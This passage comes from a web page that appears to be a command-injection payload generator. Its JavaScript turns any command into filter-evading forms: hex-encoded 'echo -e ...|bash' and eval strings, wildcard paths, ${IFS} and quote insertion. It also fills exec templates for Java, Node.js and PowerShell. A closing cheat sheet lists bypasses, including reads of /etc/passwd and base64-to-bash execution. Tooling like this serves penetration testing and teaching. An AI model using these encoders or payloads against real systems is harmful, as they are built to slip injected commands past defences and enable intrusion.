                for (let i = 0; i < str.length; i++) {
                    hex += '\\x' + str.charCodeAt(i).toString(16).padStart(2, '0');
                }
                // Use pipe to bash so the decoded string is properly parsed as shell commands
                return 'echo -e "' + hex + '"|bash';
            }

            // Alternative: eval with echo -e
            function bypassHexEval(str) {
                let hex = '';
                for (let i = 0; i < str.length; i++) {
                    hex += '\\x' + str.charCodeAt(i).toString(16).padStart(2, '0');
                }
                return 'eval $(echo -e "' + hex + '")';
            }

            // Hex encoding with ANSI-C Quoting $'...'
            // Note: $'...' is expanded BEFORE command execution, so && ; | work correctly
            // Hex encoding with ANSI-C Quoting $'...'
            // IMPORTANT: $'...' creates a SINGLE STRING, not parsed as shell syntax!
            // So "id && whoami" becomes one command name, not two commands.
            // Only use for SIMPLE commands without && || ; | etc.
            function bypassHexAnsi(str) {
                // Check if command has shell operators - if so, use eval
                let hex = '';
                for (let i = 0; i < str.length; i++) {
                    hex += '\\x' + str.charCodeAt(i).toString(16).padStart(2, '0');
                }

                if (/[&|;<>]/.test(str)) {
                    // For complex commands, wrap in eval
                    // Use $$ to escape $ in JavaScript replace() - $' is a special pattern!
                    return "eval $$'" + hex + "'";
                }

                // For simple commands, $'...' works directly
                // Use $$ to escape $ in JavaScript replace()
                return "$$'" + hex + "'";
            }

            // Backslash + Newline (for URL encoding)
            function bypassBackslashNewline(str) {
                const parts = str.split(' ');
                if (parts.length < 2) return str;
                return parts.join('%5C%0A');
            }

            // Random Case (Windows)
            function bypassRandomCase(str) {
                let result = '';
                for (let i = 0; i < str.length; i++) {
                    if (Math.random() > 0.5) {
                        result += str[i].toUpperCase();
                    } else {
                        result += str[i].toLowerCase();
                    }
                }
                return result;
            }

            // ${HOME:0:1} - Replace slashes with ${HOME:0:1}
            // /etc/passwd â†’ ${HOME:0:1}etc${HOME:0:1}passwd
            function bypassHomeSlash(str) {
                return str.replace(/\//g, '${HOME:0:1}');
            }

            // ${PWD:0:1} - Alternative slash replacement
            function bypassPwdSlash(str) {
                return str.replace(/\//g, '${PWD:0:1}');
            }

            // Wildcard ? - Convert command and path to wildcards
            // cat /etc/passwd â†’ /???/??t /???/p??s??
            function bypassWildcardQuestion(str) {
                const tokens = tokenizeCommand(str);
                return tokens.map(token => {
                    if (token.type === 'operator') return token.value;

                    // Process each word in the segment
                    const words = token.value.trim().split(/(\s+)/);
                    const processed = words.map(word => {
                        if (/^\s+$/.test(word)) return word;
                        if (!word) return word;

                        // Skip options (start with -)
                        if (word.startsWith('-')) return word;

                        // Skip variable references
                        if (word.startsWith('$')) return word;

                        // Check if it's a command or path
                        if (word.startsWith('/') || isCommand(word)) {
                            // Convert to wildcards: replace most chars with ?
                            // Keep first char and some key chars for matching
                            return wordToWildcard(word);
                        }

                        return word;
                    });

                    return processed.join('');
                }).join('');
            }

            // Helper: Convert a word to wildcard pattern
            // Helper: Convert a word to wildcard pattern with ?
            // IMPORTANT: Wildcards must include a path prefix like /???/ to work!
            // Just "i?" won't work - shell tries to match files in current directory
            // Note: Commands may be in /bin/, /usr/bin/, /sbin/, /usr/sbin/
            // Helper: Convert a word to wildcard pattern with ?
            // Strategy: Keep most characters, only replace 1 char with ?
            // This is more precise and less likely to match wrong commands
            function wordToWildcard(word) {
                if (word.length < 2) return word;

                // For paths like /bin/cat, /etc/passwd - keep path structure intact
                if (word.startsWith('/')) {
                    const parts = word.split('/').filter(p => p);
                    const wildcardParts = parts.map(part => {
                        if (part.length <= 2) return part; // Keep short parts as-is: /etc â†’ /etc
                        // Replace just ONE char in the middle: passwd â†’ pass?d, hosts â†’ hos?s
                        const mid = Math.floor(part.length / 2);
                        return part.slice(0, mid) + '?' + part.slice(mid + 1);
                    });
                    return '/' + wildcardParts.join('/');
                }

                // For command names without path - need to add full path
                // Common command locations:
                //   /bin/: cat, ls, sh, bash, echo, rm, cp, mv, chmod, mkdir, ps, kill, date, hostname
                //   /usr/bin/: id, whoami, awk, grep, sort, uniq, head, tail, wc, cut, tr, xargs, find, which
                //   /usr/sbin/: netstat (macOS)
                //   /sbin/: ifconfig, ping (some systems)

                const binCommands = ['cat', 'ls', 'sh', 'bash', 'echo', 'rm', 'cp', 'mv', 'chmod', 'mkdir', 'ps', 'kill', 'date', 'hostname', 'pwd', 'df', 'dd', 'ln', 'sleep', 'zsh'];
                const usrBinCommands = ['id', 'whoami', 'awk', 'grep', 'sort', 'uniq', 'head', 'tail', 'wc', 'cut', 'tr', 'xargs', 'find', 'which', 'env', 'curl', 'wget', 'ssh', 'scp', 'nc', 'ncat', 'python', 'python3', 'perl', 'ruby', 'php', 'base64', 'xxd', 'hexdump', 'od', 'strings', 'file', 'stat', 'touch', 'less', 'more', 'vim', 'nano', 'sed', 'tee', 'nohup', 'screen', 'tmux'];
                const usrSbinCommands = ['netstat'];
                const sbinCommands = ['ifconfig', 'ping', 'route', 'iptables'];

                let prefix = '/usr/bin/'; // default
                if (binCommands.includes(word)) prefix = '/bin/';
                else if (usrSbinCommands.includes(word)) prefix = '/usr/sbin/';
                else if (sbinCommands.includes(word)) prefix = '/sbin/';

                // Replace ONE char in command name: cat â†’ c?t, whoami â†’ whoa?i
                let cmdWildcard;
                if (word.length <= 2) {
                    cmdWildcard = word[0] + '?'; // id â†’ i?
                } else {
                    const mid = Math.floor(word.length / 2);
                    cmdWildcard = word.slice(0, mid) + '?' + word.slice(mid + 1);
                }

                return prefix + cmdWildcard;
            }

            // Wildcard * - Use asterisk wildcards
            // cat /etc/passwd â†’ /bin/c* /etc/pas*
            function bypassWildcardAsterisk(str) {
                const tokens = tokenizeCommand(str);
                return tokens.map(token => {
                    if (token.type === 'operator') return token.value;

                    const words = token.value.trim().split(/(\s+)/);
                    const processed = words.map(word => {
                        if (/^\s+$/.test(word)) return word;
                        if (!word) return word;
                        if (word.startsWith('-')) return word;
                        if (word.startsWith('$')) return word;

                        if (word.startsWith('/') || isCommand(word)) {
                            return wordToAsterisk(word);
                        }

                        return word;
                    });

                    return processed.join('');
                }).join('');
            }

            // Helper: Convert word to asterisk pattern
            // IMPORTANT: Must include path prefix for commands!
            // Helper: Convert a word to wildcard pattern with *
            // Strategy: Keep most chars for precision, use * at end
            // Helper: Convert a word to wildcard pattern with *
            // WARNING: * wildcards are less precise than ? and may match multiple files!
            // Strategy: Keep almost all chars, only replace last char with *
            function wordToAsterisk(word) {
                if (word.length < 2) return word;

                // ä¸å®‰å…¨å‘½ä»¤åˆ—è¡¨: è¿™äº›å‘½ä»¤ç”¨ * ä¼šåŒ¹é…åˆ°å¤šä¸ªæ–‡ä»¶ï¼Œä¸åšå¤„ç†
                // uniq â†’ uni* ä¼šåŒ¹é… unifdef, uniq, units ç­‰
                // sort â†’ sor* ä¼šåŒ¹é… sort, sortm ç­‰ (ä½†sorté€šå¸¸å®‰å…¨)
                const unsafeForAsterisk = ['uniq', 'un', 'uni', 'unit', 'units'];
                if (unsafeForAsterisk.includes(word)) {
                    return word; // ä¸åšé€šé…ç¬¦å¤„ç†ï¼Œä¿æŒåŸæ ·
                }

                if (word.startsWith('/')) {
                    const parts = word.split('/').filter(p => p);
                    const wildcardParts = parts.map(part => {
                        if (part.length <= 3) return part; // Keep short parts as-is: etc, bin
                        // æ£€æŸ¥æ˜¯å¦æ˜¯ä¸å®‰å…¨çš„å‘½ä»¤
                        if (unsafeForAsterisk.includes(part)) return part;
                        // Keep all but last char + *: passwd â†’ passw*
                        return part.slice(0, part.length - 1) + '*';
                    });
                    return '/' + wildcardParts.join('/');
                }

                // For commands: use same path logic as wordToWildcard
                const binCommands = ['cat', 'ls', 'sh', 'bash', 'echo', 'rm', 'cp', 'mv', 'chmod', 'mkdir', 'ps', 'kill', 'date', 'hostname', 'pwd', 'df', 'dd', 'ln', 'sleep', 'zsh'];
                const usrSbinCommands = ['netstat'];
                const sbinCommands = ['ifconfig', 'ping', 'route', 'iptables'];

                let prefix = '/usr/bin/'; // default
                if (binCommands.includes(word)) prefix = '/bin/';
                else if (usrSbinCommands.includes(word)) prefix = '/usr/sbin/';
                else if (sbinCommands.includes(word)) prefix = '/sbin/';

                // Keep all but last char + *: grep â†’ gre*, sort â†’ sor*
                // WARNING: This may match multiple files
                const cmdWildcard = word.slice(0, word.length - 1) + '*';

                return prefix + cmdWildcard;
            }

            // Function to display payload with commands and hints separated
            // ğŸ“Œ å¼€å¤´çš„è¡Œä½œä¸ºæç¤º, å…¶ä»–éç©ºè¡Œä½œä¸ºå‘½ä»¤
            // Current selected environments (multi-select)
            let selectedEnvs = new Set(); // Empty means "show all"

            // Toggle environment selection (multi-select)
            function toggleEnv(env) {
                if (env === 'all') {
                    // Reset - clear all selections
                    selectedEnvs.clear();
                    document.querySelectorAll('.env-chip').forEach(chip => {
                        chip.classList.remove('active');
                    });
                } else {
                    // Toggle specific environment
                    if (selectedEnvs.has(env)) {
                        selectedEnvs.delete(env);
                    } else {
                        selectedEnvs.add(env);
                    }
                    // Update UI
                    document.querySelectorAll('.env-chip').forEach(chip => {
                        if (chip.dataset.env === 'all') return; // Skip reset button
                        if (selectedEnvs.has(chip.dataset.env)) {
                            chip.classList.add('active');
                        } else {
                            chip.classList.remove('active');
                        }
                    });
                }
                // Re-render all payloads with filter
                func_oninput();
            }

            // Check if a title matches the selected environments
            // Returns true if title matches ALL selected environments (AND logic)
            function matchesEnv(title) {
                // If no selection, show all
                if (selectedEnvs.size === 0) return true;

                const titleLower = title.toLowerCase();

                // Define patterns for each environment
                const envPatterns = {
                    // Runtime environments
                    'java': ['[java]'],
                    'nodejs': ['[node.js]', '[nodejs]'],
                    'shell': ['[shell]'],
                    'web': ['[web]'],
                    // OS environments
                    'linux': ['[linux]', '[linux/', '/linux]', '/linux/', 'linux/macos', 'linux/macos/windows'],
                    'macos': ['[macos]', '[macos/', '/macos]', '/macos/', 'linux/macos', 'linux/macos/windows'],
                    'windows': ['[windows]', '[windows/', '/windows]', '/windows/', 'linux/macos/windows']
                };

                // Check if title matches ALL selected environments
                for (const env of selectedEnvs) {
                    const patterns = envPatterns[env] || [];
                    let matched = false;

                    for (const pattern of patterns) {
                        if (titleLower.includes(pattern.toLowerCase())) {
                            matched = true;
                            break;
                        }
                    }

                    // If any selected env doesn't match, return false
                    if (!matched) return false;
                }

                return true;
            }

            function displayPayloadWithCommands(payloadId, payloadData) {
                const commandsDisplay = document.getElementById(payloadId + '-commands-display');
                if (!commandsDisplay) {
                    console.warn(`displayPayloadWithCommands: element ${payloadId}-commands-display not found`);
                    return;
                }

                // Clear old content
                commandsDisplay.innerHTML = '';

                if (!payloadData || payloadData.trim().length === 0) {
                    return;
                }

                // Split by lines
                const lines = payloadData.split('\n');

                // Parse lines into sections: 
                // ğŸ”¥ line = section title
                // ğŸ“Œ lines = hints/notes
                // Other non-empty line = command
                let currentSection = null;
                const sections = [];

                lines.forEach((line) => {
                    const trimmedLine = line.trim();

                    // Skip empty lines
                    if (trimmedLine.length === 0) {
                        return;
                    }

                    // Check if this is a section title (starts with ğŸ”¥)
                    if (trimmedLine.startsWith('ğŸ”¥')) {
                        // Save previous section if exists
                        if (currentSection) {
                            sections.push(currentSection);
                        }
                        // Start new section with the ğŸ”¥ line as title
                        currentSection = {
                            title: trimmedLine.replace(/^ğŸ”¥/, '').trim(),
                            rawTitle: trimmedLine, // Keep raw title for env matching
                            hints: [],
                            command: null
                        };
                    } else if (currentSection) {
                        // Check if this is a hint line (starts with ğŸ“Œ)
                        if (trimmedLine.startsWith('ğŸ“Œ')) {
                            currentSection.hints.push(trimmedLine.replace(/^ğŸ“Œ/, '').trim());
                        } else if (!currentSection.command) {
                            // First non-hint, non-empty line is the command
                            currentSection.command = trimmedLine;
                        }
                    }
                });

                // Don't forget the last section
                if (currentSection) {
                    sections.push(currentSection);
                }

                // If no sections found (no ğŸ”¥ markers), treat all non-empty lines as commands
                if (sections.length === 0) {
                    const allCommands = lines.map(l => l.trim()).filter(l => l.length > 0);
                    allCommands.forEach((cmd, index) => {
                        sections.push({
                            title: `[${index + 1}]`,
                            rawTitle: '',
                            hints: [],
                            command: cmd
                        });
                    });
                }

                // Filter sections by environment (multi-select)
                const filteredSections = sections.filter(section => {
                    return matchesEnv(section.rawTitle || section.title);
                });

                // Display each section
                let commandIndex = 1;
                filteredSections.forEach((section) => {
                    if (!section.command) return; // Skip sections without commands

                    const hintSection = document.createElement('div');
                    hintSection.className = 'hint-section';

                    // Title (from ğŸ”¥ line or index)
                    const strong = document.createElement('strong');
                    strong.textContent = section.title || `[${commandIndex}]`;
                    hintSection.appendChild(strong);

                    // Hints (as <p> elements, not in hint-code)
                    if (section.hints && section.hints.length > 0) {
                        section.hints.forEach(hint => {
                            const p = document.createElement('p');
                            p.textContent = hint;
                            hintSection.appendChild(p);
                        });
                    }

                    // Command (in hint-code with copy button)
                    const codeWrapper = document.createElement('div');
                    codeWrapper.className = 'code-with-copy';
                    codeWrapper.style.position = 'relative';

                    const copyBtn = document.createElement('button');
                    copyBtn.className = 'copy-btn';
                    copyBtn.textContent = 'Copy';
                    copyBtn.style.position = 'absolute';
                    copyBtn.style.top = '5px';
                    copyBtn.style.right = '5px';
                    copyBtn.style.zIndex = '10';
                    copyBtn.style.opacity = '0';
                    copyBtn.style.transition = 'opacity 0.3s ease';
                    copyBtn.style.pointerEvents = 'auto';

                    const cmdText = section.command;
                    copyBtn.onclick = function (e) {
                        e.stopPropagation();
                        navigator.clipboard.writeText(cmdText).then(() => {
                            const originalText = copyBtn.textContent;
                            copyBtn.textContent = 'Copied!';
                            setTimeout(() => {
                                copyBtn.textContent = originalText;
                            }, 1500);
                        }).catch(err => {
                            console.error('Failed to copy:', err);
                        });
                    };

                    const pre = document.createElement('pre');
                    pre.className = 'hint-code';
                    const code = document.createElement('code');
                    code.textContent = section.command;
                    pre.appendChild(code);

                    // Add hover effect
                    codeWrapper.addEventListener('mouseenter', function () {
                        copyBtn.style.opacity = '1';
                    });
                    codeWrapper.addEventListener('mouseleave', function () {
                        copyBtn.style.opacity = '0';
                    });

                    codeWrapper.appendChild(copyBtn);
                    codeWrapper.appendChild(pre);
                    hintSection.appendChild(codeWrapper);

                    commandsDisplay.appendChild(hintSection);
                    commandIndex++;
                });
            }

            function func_oninput() {
                try {
                    var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value);

                    var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);
                    var cmd_origin_ps_base64 = powershellBase64(cmd_origin); // PowerShell UTF-16LE Base64
                    var cmd_origin_hex = ascii_2_Hex(cmd_origin);

                    // Javaå­—ç¬¦ä¸²è½¬ä¹‰: åŒå¼•å·å’Œåæ–œæ éœ€è¦è½¬ä¹‰
                    var cmd_origin_java_escaped = cmd_origin
                        .replace(/\\/g, '\\\\')  // å…ˆè½¬ä¹‰åæ–œæ 
                        .replace(/"/g, '\\"');   // å†è½¬ä¹‰åŒå¼•å·

                    // Payload 0 - Original command
                    const payload0El = document.getElementById("payload0");
                    if (payload0El) {
                        payload0El.textContent = cmd_origin;
                    }

                    // Process each payload with all replacements
                    // 1. Java Runtime.exec() - String[] (éœ€è¦è½¬ä¹‰åŒå¼•å·)
                    const payload1Data = data1
                        .replace(/arr0w1_cmd_origin/g, cmd_origin_java_escaped)
                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                    displayPayloadWithCommands('payload1', payload1Data);

                    // 2. Java Runtime.exec() - String (Base64)
                    const payload2Data = data2
                        .replace(/arr0w1_cmd_origin/g, cmd_origin)
                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                    displayPayloadWithCommands('payload2', payload2Data);

                    // 3. Shell Encoding (Base64/Hex)
                    const cmd_origin_hex_full = ascii_2_Hex_full(cmd_origin);
                    const payload3Data = data3
                        .replace(/arr0w1_hex_full/g, cmd_origin_hex_full)
                        .replace(/arr0w1_cmd_ascii2hex/g, cmd_origin_hex)
                        .replace(/arr0w1_cmd_origin/g, cmd_origin)
                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                    displayPayloadWithCommands('payload3', payload3Data);

                    // 4. Node.js child_process (éœ€è¦è½¬ä¹‰å•å¼•å·)
                    var cmd_origin_js_escaped = cmd_origin
                        .replace(/\\/g, '\\\\')  // å…ˆè½¬ä¹‰åæ–œæ 
                        .replace(/'/g, "\\'");   // å†è½¬ä¹‰å•å¼•å·
                    const payload4Data = data4
                        .replace(/arr0w1_cmd_ascii2hex/g, cmd_origin_hex)
                        .replace(/arr0w1_cmd_origin/g, cmd_origin_js_escaped)
                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                    displayPayloadWithCommands('payload4', payload4Data);

                    // 5. PowerShell / cmd.exe (PowerShellåŒå¼•å·éœ€è¦è½¬ä¹‰)
                    var cmd_origin_ps_escaped = cmd_origin
                        .replace(/"/g, '`"');   // PowerShellç”¨åå¼•å·è½¬ä¹‰åŒå¼•å·
                    const payload5Data = data5
                        .replace(/arr0w1_base64_utf16/g, cmd_origin_ps_base64)
                        .replace(/arr0w1_cmd_origin/g, cmd_origin_ps_escaped)
                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                    displayPayloadWithCommands('payload5', payload5Data);

                    // 6. Filter Bypass Techniques - Based on PayloadsAllTheThings
                    let payload6Data = data6
                        // Single Quote bypasses
                        .replace(/arr0w1_sq_empty/g, bypassSingleQuoteEmpty(cmd_origin))
                        .replace(/arr0w1_sq_wrap_start/g, bypassSingleQuoteWrapStart(cmd_origin))
                        .replace(/arr0w1_sq_wrap_mid/g, bypassSingleQuoteWrapMid(cmd_origin))
                        // Double Quote bypasses
                        .replace(/arr0w1_dq_empty/g, bypassDoubleQuoteEmpty(cmd_origin))
                        .replace(/arr0w1_dq_wrap_start/g, bypassDoubleQuoteWrapStart(cmd_origin))
                        .replace(/arr0w1_dq_wrap_mid/g, bypassDoubleQuoteWrapMid(cmd_origin))
                        // Backslash bypasses
                        .replace(/arr0w1_bs_single/g, bypassBackslashSingle(cmd_origin))
                        .replace(/arr0w1_bs_all/g, bypassBackslashAll(cmd_origin))
                        // Backtick bypass
                        .replace(/arr0w1_backtick_empty/g, bypassBacktickEmpty(cmd_origin))
                        // $@, $(), ${x} bypasses
                        .replace(/arr0w1_dollar_at/g, bypassDollarAt(cmd_origin))
                        .replace(/arr0w1_dollar_paren/g, bypassDollarParen(cmd_origin))
                        .replace(/arr0w1_dollar_var/g, bypassDollarVar(cmd_origin))
                        // Space bypasses
                        .replace(/arr0w1_cmd_ifs_short/g, bypassIFSShort(cmd_origin))
                        .replace(/arr0w1_cmd_ifs/g, bypassIFS(cmd_origin))
                        .replace(/arr0w1_brace_expansion/g, bypassBraceExpansion(cmd_origin))
                        .replace(/arr0w1_cmd_tab/g, bypassTab(cmd_origin))
                        .replace(/arr0w1_input_redirect/g, bypassInputRedirect(cmd_origin))
                        // Hex encoding
                        .replace(/arr0w1_hex_echo/g, bypassHexEcho(cmd_origin))
                        .replace(/arr0w1_hex_eval/g, bypassHexEval(cmd_origin))
                        .replace(/arr0w1_hex_ansi/g, bypassHexAnsi(cmd_origin))
                        // Slash bypasses (${HOME:0:1}, ${PWD:0:1})
                        .replace(/arr0w1_home_slash/g, bypassHomeSlash(cmd_origin))
                        .replace(/arr0w1_pwd_slash/g, bypassPwdSlash(cmd_origin))
                        // Wildcard bypasses
                        .replace(/arr0w1_wildcard_question/g, bypassWildcardQuestion(cmd_origin))
                        .replace(/arr0w1_wildcard_asterisk/g, bypassWildcardAsterisk(cmd_origin))
                        // Other bypasses
                        .replace(/arr0w1_cmd_backslash_newline/g, bypassBackslashNewline(cmd_origin))
                        .replace(/arr0w1_cmd_random_case/g, bypassRandomCase(cmd_origin))
                        // Generic replacements
                        .replace(/arr0w1_cmd_origin/g, cmd_origin)
                        .replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                    displayPayloadWithCommands('payload6', payload6Data);

                    // Update container visibility based on environment
                    updateContainerVisibility();

                } catch (err) {
                    console.error('Error in func_oninput:', err);
                }
            }

            // Update container visibility based on selected environments
            function updateContainerVisibility() {
                // Show all containers, then hide empty ones
                const containers = ['payload1-container', 'payload2-container', 'payload3-container',
                    'payload4-container', 'payload5-container', 'payload6-container'];

                containers.forEach(containerId => {
                    const container = document.getElementById(containerId);
                    if (container) {
                        // Check if container has any visible commands after filtering
                        const commandsDisplay = container.querySelector('[id$="-commands-display"]');
                        if (commandsDisplay && commandsDisplay.children.length === 0) {
                            container.style.display = 'none';
                        } else {
                            container.style.display = 'block';
                        }
                    }
                });
            }

            // -----

            // Add hover effect for payload0 (hardcoded in HTML)
            (function () {
                const payload0HintCode = document.querySelector('#payload0-container .hint-code');
                const payload0CopyBtn = document.querySelector('#payload0-container .copy-btn');
                if (payload0HintCode && payload0CopyBtn) {
                    payload0HintCode.addEventListener('mouseenter', function () {
                        payload0CopyBtn.style.opacity = '1';
                    });
                    payload0HintCode.addEventListener('mouseleave', function () {
                        payload0CopyBtn.style.opacity = '0';
                    });
                    // Also show when hovering over the button itself
                    payload0CopyBtn.addEventListener('mouseenter', function () {
                        payload0CopyBtn.style.opacity = '1';
                    });
                    payload0CopyBtn.addEventListener('mouseleave', function () {
                        payload0CopyBtn.style.opacity = '0';
                    });
                }
            })();

            func_oninput();
        </script>

        <!-- Smart Hint System -->
        <div id="interactive-hint" class="interactive-hint">
            <div class="hint-content" style="max-width: 800px; text-align: left;">
                <h2 style="text-align: center;">ğŸ’¡ Command Injection Cheat Sheet</h2>

                <h3
                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
                    å‘½ä»¤é“¾æ¥ç¬¦ (Chaining Commands)</h3>
                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
                    <li><code>;</code> åˆ†å· - é¡ºåºæ‰§è¡Œå¤šä¸ªå‘½ä»¤</li>
                    <li><code>&&</code> AND - ä»…å½“å‰ä¸€å‘½ä»¤æˆåŠŸæ—¶æ‰§è¡Œ</li>
                    <li><code>||</code> OR - ä»…å½“å‰ä¸€å‘½ä»¤å¤±è´¥æ—¶æ‰§è¡Œ</li>
                    <li><code>&</code> åå°æ‰§è¡Œ - å‘½ä»¤åœ¨åå°è¿è¡Œ</li>
                    <li><code>|</code> ç®¡é“ - å‰ä¸€å‘½ä»¤è¾“å‡ºä½œä¸ºåä¸€å‘½ä»¤è¾“å…¥</li>
                </ul>

                <h3
                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
                    ç©ºæ ¼ç»•è¿‡ (Bypass Without Space)</h3>
                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
                    <li><code>${IFS}</code> - Internal Field Separator (Bash only, ä¸èƒ½ç”¨åœ¨å¼•å·å†…!)</li>
                    <li><code>{cat,/etc/passwd}</code> - èŠ±æ‹¬å·å±•å¼€ (Bash only)</li>
                    <li><code>cat&lt;/etc/passwd</code> - è¾“å…¥é‡å®šå‘</li>
                    <li><code>%09</code> - Tabå­—ç¬¦ (URLç¼–ç , Webåœºæ™¯)</li>
                    <li><code>$'cmd\x20arg'</code> - ANSI-C Quoting</li>
                </ul>

                <h3
                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
                    æ–œæ ç»•è¿‡ (Bypass Slash Filter)</h3>
                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
                    <li><code>${HOME:0:1}</code> - æå–HOMEè·¯å¾„ç¬¬ä¸€ä¸ªå­—ç¬¦ /</li>
                    <li><code>${PWD:0:1}</code> - æå–PWDè·¯å¾„ç¬¬ä¸€ä¸ªå­—ç¬¦ /</li>
                    <li><code>echo . | tr '!-0' '"-1'</code> - ç”¨trå‘½ä»¤ç”Ÿæˆ /</li>
                </ul>

                <h3
                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
                    å‘½ä»¤åç»•è¿‡ (Bypass Command Filter)</h3>
                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
                    <li><code>wh''oami</code> / <code>wh""oami</code> - ç©ºå¼•å·æ’å…¥</li>
                    <li><code>w\hoami</code> - åæ–œæ æ’å…¥</li>
                    <li><code>wh``oami</code> - ç©ºåå¼•å·æ’å…¥</li>
                    <li><code>who$@ami</code> / <code>who$()ami</code> - å˜é‡/å­shellæ’å…¥</li>
                    <li><code>/???/i?</code> - é€šé…ç¬¦ ? (å¿…é¡»æœ‰è·¯å¾„å‰ç¼€!)</li>
                    <li><code>/b*/i*</code> - é€šé…ç¬¦ * (å¿…é¡»æœ‰è·¯å¾„å‰ç¼€!)</li>
                    <li>âš ï¸ <code>i*</code> å•ç‹¬ä½¿ç”¨ä¼šåŒ¹é…å½“å‰ç›®å½•æ–‡ä»¶ï¼ŒæŠ¥é”™!</li>
                </ul>

                <h3
                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
                    ç¼–ç ç»•è¿‡ (Encoding Bypass)</h3>
                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
                    <li><code>echo -e "\x69\x64"|bash</code> - Hex + ç®¡é“æ‰§è¡Œ âœ… æ”¯æŒ && || ;</li>
                    <li><code>eval $(echo -e "\x69\x64")</code> - Hex + evalæ‰§è¡Œ âœ… æ”¯æŒ && || ;</li>
                    <li><code>$'\x69\x64'</code> - ANSI-C Hex âš ï¸ ä»…é™ç®€å•å‘½ä»¤!</li>
                    <li><code>eval $'\x69\x64...'</code> - ANSI-C + eval âœ… æ”¯æŒ && || ;</li>
                    <li><code>`echo -e "\x69\x64"`</code> - âš ï¸ ä¼šæ‰§è¡Œä½†æŠ¥é”™ (è¾“å‡ºè¢«å½“å‘½ä»¤)</li>
                    <li><code>echo aWQ=|base64 -d|bash</code> - Base64ç¼–ç  âœ…</li>
                </ul>

                <h3
                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
                    å‘½ä»¤æ›¿æ¢æ³¨å…¥ (Inside A Command)</h3>
                <ul style="font-family: var(--font-mono); font-size: 0.85rem;">
                    <li><code>`cmd`</code> - åå¼•å·å‘½ä»¤æ›¿æ¢</li>
                    <li><code>$(cmd)</code> - $() å‘½ä»¤æ›¿æ¢</li>
                </ul>

                <h3
                    style="color: var(--primary-color); margin-top: 20px; border-bottom: 1px solid var(--primary-color); padding-bottom: 5px;">
                    âš ï¸ é‡è¦é™åˆ¶</h3>
                <ul style="font-size: 0.85rem; color: #ff6b6b;">
                    <li><strong>åå¼•å·é™·é˜±</strong> - <code>`id`</code> ä¼šæ‰§è¡Œ idï¼Œä½†è¾“å‡º <code>uid=503...</code> ä¼šè¢«å½“ä½œå‘½ä»¤æ‰§è¡Œï¼ŒæŠ¥é”™
                        "command
                        not found"ï¼<br>
                        <span style="color: #aaa; font-size: 0.8rem;">â†’ å‘½ä»¤ä¼šæ‰§è¡Œï¼Œä½†éšåæŠ¥é”™ã€‚ç”¨äºç›²æ³¨/å¸¦å¤–å¯è¡Œï¼Œç›´æ¥å›æ˜¾ä¸è¡Œ</span>
                    </li>
                    <li><strong>Shell å…³é”®å­—ä¸èƒ½ç»•è¿‡</strong> - <code>while</code>, <code>do</code>, <code>done</code>,
                        <code>if</code>, <code>then</code>, <code>fi</code>, <code>for</code> ç­‰æ˜¯ shell
                        è¯­æ³•çš„ä¸€éƒ¨åˆ†ï¼Œä¸èƒ½ç”¨å¼•å·/åæ–œæ ç»•è¿‡!
                    </li>
                    <li><strong>${IFS}</strong> ä¸èƒ½ç”¨åœ¨å•å¼•å·å†… (å¦‚ awk '{print $5}' ä¸­çš„ç©ºæ ¼æ— æ³•æ›¿æ¢)</li>
                    <li><strong>Brace Expansion</strong> {cmd,arg} ä»…åœ¨ Bash æœ‰æ•ˆï¼ŒZsh ä¸æ”¯æŒ</li>
                    <li><strong>Random Case</strong> wHoAmI ä»…åœ¨ Windows æœ‰æ•ˆ</li>
                </ul>

                <p style="margin-top: 20px; font-size: 0.85rem; color: var(--text-secondary); text-align: center;">
                    å‚è€ƒ: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection"
                        target="_blank" style="color: var(--primary-color);">PayloadsAllTheThings - Command
                        Injection</a>
                </p>
                <button class="hint-close" onclick="toggleHint()" style="margin-top: 15px;">å…³é—­</button>
            </div>
        </div>

        <script>
            function toggleHint(event) {
                if (event) event.stopPropagation();
                const hint = document.getElementById('interactive-hint');
                hint.classList.toggle('show');

                // Add click listener to close on outside click
                if (hint.classList.contains('show')) {
                    setTimeout(() => {
                        document.addEventListener('click', closeHintOnOutsideClick);
                    }, 0);
                } else {
                    document.removeEventListener('click', closeHintOnOutsideClick);
                }
            }

            function closeHintOnOutsideClick(event) {
                const hint = document.getElementById('interactive-hint');
                const hintContent = hint.querySelector('.hint-content');

                if (hintContent && !hintContent.contains(event.target)) {
                    hint.classList.remove('show');
                    document.removeEventListener('click', closeHintOnOutsideClick);
                }
            }
        </script>

</html>